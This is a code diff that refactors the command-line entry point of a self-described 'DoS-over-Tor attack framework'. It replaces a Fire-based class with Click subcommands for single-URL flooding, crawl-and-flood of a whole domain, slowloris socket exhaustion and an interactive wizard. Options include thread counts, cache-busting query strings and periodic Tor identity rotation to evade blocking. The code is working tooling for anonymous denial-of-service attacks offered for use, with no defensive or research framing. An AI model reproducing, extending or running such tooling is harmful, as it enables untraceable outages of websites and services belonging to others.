@@ -1,176 +1,205 @@
 #!/usr/bin/env python
+"""
+CLI entry point for the DoS-over-Tor attack framework. Provides Click-based subcommands: `singleshot`, `fullauto`, `slowloris`, and `interactive`.
+"""
 
-import app.console
-import app.net
-import app.tor
-from app.command import Platoon
-from app.weapons.singleshot import SingleShotFactory
-from app.weapons.fullauto import FullAutoFactory
-from app.weapons.slowloris import SlowLorisFactory
-import fire
-import signal
-import sys
+from typing import Any, Callable, Optional
+import click
+from app.runner import AttackRunner
+from app.models import AttackConfig
+from app.wizard import InteractiveWizard
 
 
-class CLI:
+@click.group()
+def cli() -> None:
+    """DoS-over-Tor Attack Framework"""
+    pass
 
-    def __init__(
-            self,
-            tor_address='127.0.0.1',
-            tor_proxy_port=9050,
-            tor_ctrl_port=9051,
-            num_soldiers=10,
-            http_method='GET',
-            cache_buster=False
-        ):
-        """
 
-        :param num_soldiers: Maximum of solider threads to spin up for the attack
-        """
+def common_options(func: Callable[..., Any]) -> Callable[..., Any]:
+    """Decorator to add common options to all subcommands"""
+    func = click.option(
+        '--tor-address',
+        default='127.0.0.1',
+        help='Tor service address'
+    )(func)
+    func = click.option(
+        '--tor-proxy-port',
+        default=9050,
+        type=click.IntRange(1, 65535),
+        help='Tor SOCKS proxy port'
+    )(func)
+    func = click.option(
+        '--tor-ctrl-port',
+        default=9051,
+        type=click.IntRange(1, 65535),
+        help='Tor control port'
+    )(func)
+    func = click.option(
+        '--num-threads',
+        default=10,
+        type=click.IntRange(1, 100),
+        help='Number of soldier threads'
+    )(func)
+    func = click.option(
+        '--http-method',
+        default='GET',
+        type=click.Choice(['GET', 'POST', 'PUT', 'DELETE']),
+        help='HTTP method for requests'
+    )(func)
+    func = click.option(
+        '--cache-buster',
+        default=False,
+        is_flag=True,
+        help='Add cache-busting query strings'
+    )(func)
+    func = click.option(
+        '--identity-rotation-interval',
+        default=None,
+        type=click.IntRange(1),
+        help='Tor identity rotation interval in seconds'
+    )(func)
+    return func
 
-        self._tor_address = tor_address
-        self._tor_proxy_port = tor_proxy_port
-        self._tor_ctrl_port = tor_ctrl_port
 
-        self._platoon = None  # app.command.Platoon
-        self._num_soldiers = num_soldiers
+@cli.command()
+@click.argument('target')
+@common_options
+def singleshot(
+    target: str,
+    tor_address: str,
+    tor_proxy_port: int,
+    tor_ctrl_port: int,
+    num_threads: int,
+    http_method: str,
+    cache_buster: bool,
+    identity_rotation_interval: Optional[int]
+) -> None:
+    """Run single-shot attack on a URL"""
+    config = AttackConfig(
+        mode='singleshot',
+        target=target,
+        tor_address=tor_address,
+        tor_proxy_port=tor_proxy_port,
+        tor_ctrl_port=tor_ctrl_port,
+        num_threads=num_threads,
+        http_method=http_method,
+        cache_buster=cache_buster,
+        identity_rotation_interval=identity_rotation_interval
+    )
+    runner = AttackRunner(config)
+    try:
+        success = runner.run()
+        exit(0 if success else 1)
+    except KeyboardInterrupt:
+        exit(1)
 
-        self._http_method = str(http_method).upper()
-        self._cache_buster = cache_buster
 
-        self._register_sig_handler()
+@cli.command()
+@click.argument('target')
+@click.option(
+    '--max-urls',
+    default=500,
+    type=click.IntRange(1),
+    help='Maximum URLs to discover per thread'
+)
+@click.option(
+    '--max-time',
+    default=180,
+    type=click.IntRange(1),
+    help='Maximum crawl time in seconds per thread'
+)
+@common_options
+def fullauto(
+    target: str,
+    max_urls: int,
+    max_time: int,
+    tor_address: str,
+    tor_proxy_port: int,
+    tor_ctrl_port: int,
+    num_threads: int,
+    http_method: str,
+    cache_buster: bool,
+    identity_rotation_interval: Optional[int]
+) -> None:
+    """Run full-auto attack on a domain with crawling"""
+    config = AttackConfig(
+        mode='fullauto',
+        target=target,
+        fullauto_max_urls=max_urls,
+        fullauto_max_time=max_time,
+        tor_address=tor_address,
+        tor_proxy_port=tor_proxy_port,
+        tor_ctrl_port=tor_ctrl_port,
+        num_threads=num_threads,
+        http_method=http_method,
+        cache_buster=cache_buster,
+        identity_rotation_interval=identity_rotation_interval
+    )
+    runner = AttackRunner(config)
+    try:
+        success = runner.run()
+        exit(0 if success else 1)
+    except KeyboardInterrupt:
+        exit(1)
 
-    def singleshot(self, target):
-        """
-        Run an attack on a single URL.
-        :param target: The target URL of the attack
-        """
 
-        try:
+@cli.command()
+@click.argument('target')
+@click.option(
+    '--num-sockets',
+    default=100,
+    type=click.IntRange(1),
+    help='Number of sockets per thread'
+)
+@common_options
+def slowloris(
+    target: str,
+    num_sockets: int,
+    tor_address: str,
+    tor_proxy_port: int,
+    tor_ctrl_port: int,
+    num_threads: int,
+    http_method: str,
+    cache_buster: bool,
+    identity_rotation_interval: Optional[int]
+) -> None:
+    """Run slowloris attack on a URL"""
+    config = AttackConfig(
+        mode='slowloris',
+        target=target,
+        slowloris_num_sockets=num_sockets,
+        tor_address=tor_address,
+        tor_proxy_port=tor_proxy_port,
+        tor_ctrl_port=tor_ctrl_port,
+        num_threads=num_threads,
+        http_method=http_method,
+        cache_buster=cache_buster,
+        identity_rotation_interval=identity_rotation_interval
+    )
+    runner = AttackRunner(config)
+    try:
+        success = runner.run()
+        exit(0 if success else 1)
+    except KeyboardInterrupt:
+        exit(1)
 
-            self._init()
 
-            app.console.system("running singleshot")
+@cli.command()
+def interactive() -> None:
+    """Run attack in interactive wizard mode"""
+    wizard = InteractiveWizard()
+    try:
+        success = wizard.run()
+        exit(0 if success else 1)
+    except KeyboardInterrupt:
+        exit(1)
 
-            weapon_factory = SingleShotFactory(
-                http_method=self._http_method,
-                cache_buster=self._cache_buster
-            )
 
-            self._platoon.attack(
-                weapon_factory=weapon_factory,
-                target_url=target
-            )
-
-        except Exception as ex:
-
-            app.console.error(str(ex))
-
-        self._shutdown()
-
-    def fullauto(self, target):
-        """
-        Run an attack a domain, crawling all links found on the site.
-        :param target: The target URL of the attack
-        """
-
-        try:
-
-            self._init()
-
-            app.console.system("running fullauto")
-
-            weapon_factory = FullAutoFactory(
-                http_method=self._http_method,
-                cache_buster=self._cache_buster
-            )
-
-            self._platoon.attack(
-                weapon_factory=weapon_factory,
-                target_url=target
-            )
-
-        except Exception as ex:
-
-            app.console.error(str(ex))
-
-        self._shutdown()
-
-    def slowloris(self, target, num_sockets=100):
-        """
-        Run a slow loris, low bandwidth attack on the given URL / domain.
-        :param target: The target URL of the attack
-        :param num_sockets: The number of sockets to open for each soldier thread
-        """
-
-        try:
-
-            self._init()
-
-            app.console.system("running slowloris")
-
-            weapon_factory = SlowLorisFactory(
-                http_method=self._http_method,
-                cache_buster=self._cache_buster,
-                num_sockets=num_sockets
-            )
-
-            self._platoon.attack(
-                weapon_factory=weapon_factory,
-                target_url=target
-            )
-
-        except Exception as ex:
-
-            app.console.error(str(ex))
-
-        self._shutdown()
-
-    def _init(self):
-
-        app.console.system("connecting to TOR; %s (proxy %d) (ctrl %d)" % (
-            self._tor_address,
-            self._tor_proxy_port,
-            self._tor_ctrl_port
-        ))
-
-        app.tor.connect(
-            address=self._tor_address,
-            proxy_port=self._tor_proxy_port,
-            ctrl_port=self._tor_ctrl_port
-        )
-
-        app.console.system("requesting new identity on TOR")
-        app.tor.new_ident()
-
-        ourip = app.net.lookupip()
-        app.console.system("TOR IP; %s" % ourip)
-
-        app.net.new_user_agent()
-        app.console.system("User-Agent; %s" % app.net.get_user_agent())
-
-        self._platoon = Platoon(
-            num_soldiers=self._num_soldiers
-        )
-
-    def _shutdown(self):
-
-        app.console.system("shutting down")
-
-        app.console.system("closing connection to TOR")
-        app.tor.close()
-
-        app.console.shutdown()
-
-    def _register_sig_handler(self):
-
-        signal.signal(signal.SIGINT, self._signal_handler)
-
-    def _signal_handler(self, sig, frame):
-
-        app.console.system("signal received, holding fire")
-        self._platoon.hold_fire()
+def main() -> None:
+    cli()
 
 
 if __name__ == '__main__':
-    fire.Fire(CLI)
+    main()
+
